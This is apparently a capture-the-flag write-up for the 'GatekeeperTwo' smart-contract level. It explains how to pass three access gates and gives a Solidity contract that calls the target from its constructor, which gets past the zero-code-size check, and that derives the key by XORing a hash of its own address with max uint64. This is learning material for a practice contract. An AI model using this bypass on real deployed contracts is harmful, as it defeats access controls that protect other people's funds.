#GatekeeperTwo

The first part is the same as previous telephone level where we just use a smart contract.

The second part requires us that the address contain 0 code, which means that we have to call
the function before it is deployed.

The third part is simple as long as we just take the hash and xor it with the max uint64 which
will give us our gate key. We pass this in and we complete the level.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract GatekeeperPass {
    bool public success;
    constructor(address _gateKeeperAddress) {
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool _success, ) = _gateKeeperAddress.call(abi.encodeWithSignature("enter(bytes8)", bytes8(gateKey)));
        success = _success;
    }
}
```
